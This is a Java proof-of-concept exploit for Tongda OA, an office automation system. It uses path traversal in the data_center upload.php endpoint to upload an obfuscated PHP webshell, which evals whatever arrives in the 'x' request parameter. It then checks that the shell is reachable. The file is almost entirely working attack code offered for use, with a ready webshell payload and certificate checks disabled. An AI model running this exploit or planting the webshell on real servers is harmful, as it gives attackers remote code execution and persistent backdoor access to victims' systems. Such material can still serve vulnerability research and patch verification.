package poc;

import com.github.kevinsawicki.http.HttpRequest;

public class TongdaOA_ManagementUpload {
    private String url;//通达OA url
    private String path;//漏洞目录
    private String cookie;//cookie
    private String fileName="shell.php";//上传文件名
    private String payload="<?php class G6uUX6lU { public function __construct($H0Lp0){ @eval(\"/*Zq2m6k6oUg*/\".$H0Lp0.\"/*Zq2m6k6oUg*/\"); }}new G6uUX6lU($_REQUEST['x']);?>";//webshell内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getPayload() {
        return payload;
    }

    public void setPayload(String payload) {
        this.payload = payload;
    }

    public boolean POC(){
        //定义漏洞目录
        path="/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";
        //判断当响应码为200时表示存在漏洞
       HttpRequest statusRequest= HttpRequest.get(url+path);
       if (statusRequest.code()!=200){
           return false;
       }else {
          HttpRequest fileRequest = HttpRequest.post(url+path)
                  .trustAllCerts()
                  .trustAllHosts()
                  .header("Cookie",cookie)
                  .part("FILE1",fileName,payload);
          fileRequest.body();
          if(HttpRequest.get(url+"/_"+fileName).code()==200)
          {
              path="_shell.php";
              return true;
          }else {
              return false;
          }
       }
    }
}
